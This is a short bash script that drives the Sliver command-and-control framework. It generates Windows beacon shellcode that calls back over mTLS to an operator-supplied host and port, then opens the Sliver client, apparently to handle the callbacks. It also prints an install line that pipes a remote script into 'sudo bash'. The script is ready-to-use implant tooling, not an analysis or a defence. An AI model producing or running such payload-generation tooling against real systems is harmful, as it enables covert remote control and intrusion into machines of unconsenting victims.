#!/bin/bash
# Sliver C2 - Generate Shellcode & Setup Listener
# Usage: ./generate_and_listen.sh <LHOST> <LPORT>

if [ $# -lt 2 ]; then
    echo "Usage: ./generate_and_listen.sh <LHOST> <LPORT>"
    exit 1
fi

LHOST=$1
LPORT=$2
OUTPUT_FILE="shellcode.bin"

echo "[*] Sliver C2 Framework"
echo "[*] LHOST: $LHOST"
echo "[*] LPORT: $LPORT"

# Check if sliver-client exists
if ! command -v sliver-client &> /dev/null; then
    echo "[-] sliver-client not found!"
    echo "[!] Install: curl https://sliver.sh/install | sudo bash"
    exit 1
fi

# Create sliver commands file
SLIVER_COMMANDS=$(mktemp)
cat > "$SLIVER_COMMANDS" << EOF
generate beacon --mtls ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --skip-symbols --save ${OUTPUT_FILE}
exit
EOF

# Generate shellcode using Sliver (pipe commands to interactive mode)
sliver-client < "$SLIVER_COMMANDS"
rm -f "$SLIVER_COMMANDS"

if [ ! -f "$OUTPUT_FILE" ]; then
    echo "[-] Failed to generate shellcode!"
    exit 1
fi

FILE_SIZE=$(stat -f%z "$OUTPUT_FILE" 2>/dev/null || stat -c%s "$OUTPUT_FILE" 2>/dev/null)
echo "[+] Shellcode generated: $OUTPUT_FILE"
echo "[+] Size: $FILE_SIZE bytes"
echo "[*] Starting mTLS listener on ${LHOST}:${LPORT}..."

sliver-client

